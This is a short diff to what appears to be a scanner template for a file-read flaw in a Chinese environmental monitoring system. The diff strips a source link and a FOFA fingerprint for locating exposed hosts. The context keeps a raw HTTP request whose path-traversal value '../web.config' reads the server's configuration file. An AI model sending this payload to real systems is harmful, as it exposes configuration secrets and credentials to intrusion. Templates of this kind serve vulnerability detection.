@@ -3,12 +3,8 @@ info:
   name: 3C环境自动监测监控系统ReadLog文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uzv14ogbfdm6363v'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uzv14ogbfdm6363v
-    fofa: icon_hash="-338936081"
 http:
 - raw:
   - 'GET /ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config HTTP/1.1
